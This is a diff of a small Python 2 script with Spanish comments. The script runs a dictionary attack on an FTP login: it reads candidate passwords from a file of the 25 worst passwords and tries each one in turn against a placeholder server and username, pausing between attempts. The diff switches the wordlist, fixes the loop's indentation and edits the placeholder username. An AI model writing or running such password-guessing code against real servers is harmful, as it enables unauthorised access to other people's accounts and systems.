@@ -5,7 +5,7 @@ from ftplib import FTP_TLS
 import time
 
 RUTA_SERVIDOR_FTP = 'yourserver_here'
-dict = open('pass.txt','r').readlines()
+dict = open('25peores_pass.txt','r').readlines()
 
 def cliente_ftp_conexion(servidor, nombre_usuario, password):
 #abrimos la conexion
@@ -22,11 +22,11 @@ def cliente_ftp_conexion(servidor, nombre_usuario, password):
 	
  
 if __name__ == '__main__':
-for line in dict:
+	for line in dict:
 		line = line.replace('\n',"")
 		print line
 		try:	
-			cliente_ftp_conexion(servidor=RUTA_SERVIDOR_FTP, nombre_usuario='your_user_name_here',password=line)
+			cliente_ftp_conexion(servidor=RUTA_SERVIDOR_FTP, nombre_usuario='yourusername',password=line)
 			time.sleep(10)
 		except Exception, e:
 			print e
